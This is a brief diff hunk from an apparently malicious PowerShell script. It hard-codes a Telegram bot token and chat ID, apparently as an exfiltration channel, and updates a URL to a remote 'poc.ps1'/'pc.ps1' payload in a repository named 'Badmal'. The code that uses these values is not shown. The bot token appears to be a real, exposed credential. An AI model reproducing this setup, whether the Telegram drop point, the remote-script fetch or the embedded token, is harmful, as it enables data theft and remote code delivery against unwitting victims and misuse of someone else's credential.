@@ -11,7 +11,7 @@
 
 $BotToken = "1986077986:AAFPe9UPdKmmFXpkCh5h1FTgQpzskVbly3Q"
 $ChatID = '-422833003'
-$githubScript = 'https://raw.githubusercontent.com/cr1pt0-med/Badmal/main/poc.ps1'
+$githubScript = 'https://raw.githubusercontent.com/cr1pt0-med/Bad/main/pc.ps1'
 
 
 
